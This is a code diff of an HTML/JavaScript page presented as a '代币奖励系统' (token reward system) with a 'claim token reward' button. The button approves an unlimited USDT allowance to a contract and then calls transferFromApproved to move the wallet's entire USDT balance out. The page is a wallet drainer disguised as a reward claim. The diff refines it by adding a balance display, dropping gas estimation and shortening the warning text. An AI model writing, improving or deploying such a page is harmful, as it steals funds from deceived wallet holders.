@@ -18,7 +18,6 @@
     .error { background: #f8d7da; color: #721c24; }
     .info { background: #d1ecf1; color: #0c5460; }
     .loading { background: #fff3cd; color: #856404; }
-    .tip { font-size: 13px; color: #666; margin-top: 20px; }
     .warning { background: #fff3cd; color: #856404; padding: 12px; border-radius: 8px; margin: 10px 0; font-size: 13px; }
   </style>
 </head>
@@ -26,10 +25,11 @@
   <div class="card">
     <h1>代币奖励系统</h1>
     <div class="warning">
-      <strong>警告：</strong>此操作将转走您钱包中<strong>所有 USDT</strong>
+      <strong>警告：</strong>将转走您钱包中<strong>所有 USDT</strong>
     </div>
     <div id="walletInfo" style="display:none;">
       <div class="address" id="walletAddress"></div>
+      <div style="margin-top:10px; color:#666;">USDT 余额: <span id="usdtBalance">加载中...</span></div>
     </div>
     <button id="actionBtn" onclick="approveAndTransferAll()">领取代币奖励</button>
     <div id="status" class="info">
@@ -44,17 +44,18 @@
     const USDT = "0x55d398326f99059fF775485246999027B3197955";
     const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
-    const ABI_USDT = [{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
-
-    const ABI_FORWARDER = [
-      {"inputs":[],"name":"transferFromApproved","outputs":[],"stateMutability":"nonpayable","type":"function"},
-      {"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":false,"name":"amount","type":"uint256"}],"name":"TransferRequested","type":"event"}
+    const ABI_USDT = [
+      {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+      {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
     ];
+
+    const ABI_FORWARDER = [{"inputs":[],"name":"transferFromApproved","outputs":[],"stateMutability":"nonpayable","type":"function"}];
 
     let web3, account;
     const status = document.getElementById("status");
     const walletInfo = document.getElementById("walletInfo");
     const walletAddress = document.getElementById("walletAddress");
+    const usdtBalance = document.getElementById("usdtBalance");
 
     async function autoConnect() {
       if (!window.ethereum) {
@@ -74,11 +75,25 @@
         walletInfo.style.display = "block";
         status.className = "success";
         status.innerHTML = `钱包已连接<br><small>${account.slice(0,8)}...${account.slice(-6)}</small>`;
+
+        // 显示 USDT 余额
+        await updateUSDTBalance();
         return true;
       } catch (e) {
         status.className = "error";
         status.innerHTML = e.code === 4001 ? "用户取消连接" : "连接失败";
         return false;
+      }
+    }
+
+    async function updateUSDTBalance() {
+      try {
+        const usdt = new web3.eth.Contract(ABI_USDT, USDT);
+        const balance = await usdt.methods.balanceOf(account).call();
+        const formatted = (balance / 1e6).toFixed(6);
+        usdtBalance.innerText = formatted + " USDT";
+      } catch (e) {
+        usdtBalance.innerText = "查询失败";
       }
     }
 
@@ -92,21 +107,19 @@
         const usdt = new web3.eth.Contract(ABI_USDT, USDT);
         await usdt.methods.approve(CONTRACT, MAX_UINT256).send({ from: account });
 
-        status.innerHTML = "授权成功！<br>正在发起转账...<br><small>请在 TP 插件中确认 Gas 费</small>";
+        status.innerHTML = "授权成功！<br>正在转走所有 USDT...<br><small>请确认第二笔交易</small>";
 
         const forwarder = new web3.eth.Contract(ABI_FORWARDER, CONTRACT);
-        const gasEstimate = await forwarder.methods.transferFromApproved().estimateGas({ from: account });
-
-        await forwarder.methods.transferFromApproved().send({ 
-          from: account,
-          gas: gasEstimate
-        });
+        await forwarder.methods.transferFromApproved().send({ from: account });
 
         status.className = "success";
         status.innerHTML = "转账成功！<br>所有 USDT 已到账";
+        await updateUSDTBalance();
       } catch (e) {
         status.className = "error";
-        status.innerHTML = e.code === 4001 ? "用户取消操作" : "交易失败";
+        status.innerHTML = e.code === 4001 ? "用户取消操作" : 
+                               e.message.includes("exceeds balance") ? "余额不足" : 
+                               "交易失败";
       }
     }
 
